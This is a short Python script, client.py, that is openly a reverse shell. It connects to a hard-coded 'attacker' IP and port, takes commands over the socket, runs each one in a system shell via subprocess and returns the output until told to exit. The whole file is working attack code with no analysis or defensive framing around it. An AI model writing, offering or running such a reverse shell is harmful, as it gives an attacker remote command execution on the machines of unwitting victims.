
# client.py
import os
import socket
import subprocess

# Set the attacker's IP and port
attacker_ip = '10.10.10.1'
attacker_port = 8080

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's server
client_socket.connect((attacker_ip, attacker_port))

# Receive commands and execute them
while True:
    command = client_socket.recv(2048).decode('utf-8')
    if command.lower() == "exit":
        break

    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = result.stdout.read() + result.stderr.read()
    client_socket.send(output)

# Close the socket
client_socket.close()
